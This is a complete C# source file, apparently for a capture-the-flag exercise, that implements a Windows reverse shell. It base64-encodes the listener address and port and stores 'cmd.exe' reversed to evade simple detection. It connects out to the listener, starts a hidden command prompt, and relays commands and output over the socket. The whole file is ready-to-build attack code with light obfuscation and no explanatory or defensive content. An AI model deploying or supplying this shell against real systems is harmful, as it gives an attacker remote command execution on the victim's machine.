using System;
using System.Net.Sockets;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;

namespace ReverseShellCTF
{
    class Program
    {
        static StreamWriter writer;

        public static string ReverseString(string s)
        {
            return new string(s.Reverse().ToArray());
        }

        static void Main(string[] args)
        {
            try
            {
                string b_ip = "MTkyLjE2OC41LjU="; //base64 encoded LHost IP
                string b_port = "NDQ1NQ=="; //base64 encoded LHost Port


                string ip = Encoding.UTF8.GetString(Convert.FromBase64String(b_ip));
                int port = int.Parse(Encoding.UTF8.GetString(Convert.FromBase64String(b_port)));

                using (TcpClient client = new TcpClient(ip, port))
                using (NetworkStream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                {
                    writer = new StreamWriter(stream) { AutoFlush = true };

                    string reversedCmd = "exe.dmc"; 
                    string shellName = ReverseString(reversedCmd);

                    Process process = new Process();
                    process.StartInfo.FileName = shellName;
                    process.StartInfo.CreateNoWindow = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.RedirectStandardInput = true;
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.RedirectStandardError = true;

                    process.OutputDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data))
                        {
                            try { writer.WriteLine(e.Data); } catch { }
                        }
                    };

                    process.ErrorDataReceived += (sender, e) => {
                        if (!string.IsNullOrEmpty(e.Data))
                        {
                            try { writer.WriteLine(e.Data); } catch { }
                        }
                    };

                    process.Start();
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    while (true)
                    {
                        string cmd = reader.ReadLine();
                        if (cmd == null) break;

                        process.StandardInput.WriteLine(cmd);
                        process.StandardInput.Flush();
                    }

                    process.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText("C:\\Windows\\Temp\\rev_error.txt", ex.ToString());
            }
        }
    }
}
